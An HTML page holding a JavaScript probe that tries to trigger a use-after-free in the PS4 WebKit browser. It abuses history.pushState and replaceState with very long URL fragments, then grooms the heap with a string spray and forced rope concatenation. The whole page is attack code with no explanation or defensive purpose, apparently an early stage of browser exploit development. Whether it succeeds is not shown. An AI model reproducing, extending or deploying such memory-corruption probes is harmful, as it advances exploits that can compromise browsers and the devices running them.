<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – String Rope UAF Probe</title>

</head>

<body>
<h2>PS4 WebKit – Fragment String Reuse</h2>
<button onclick="run()">RUN STRING OVERLAY</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";
    log("=== START STRING UAF PROBE ===");

    let size = 977;
    const STEP = 14461;

    // ---------------------------
    // Phase 1 – Trigger UAF
    // ---------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);

    // ---------------------------
    // Phase 2 – String Heap Reuse
    // ---------------------------
    log("[REUSE] Allocating large strings");
    let pool = [];
    for(let i=0;i<4000;i++){
        pool.push(("X"+i).repeat(64));
    }

    log("[REUSE] Forcing rope concatenation");
    let rope = "";
    for(let i=0;i<pool.length;i++){
        rope += pool[i];
    }

    log("[REUSE] Forcing flatten");
    rope = rope.slice(0);

    // ---------------------------
    // Phase 3 – Integrity Check
    // ---------------------------
    let hash = 0;
    for(let i=0;i<rope.length;i+=1024){
        hash ^= rope.charCodeAt(i);
    }

    log("Hash="+hash);
    log("=== END PROBE ===");
}
</script>
</body>
</html>

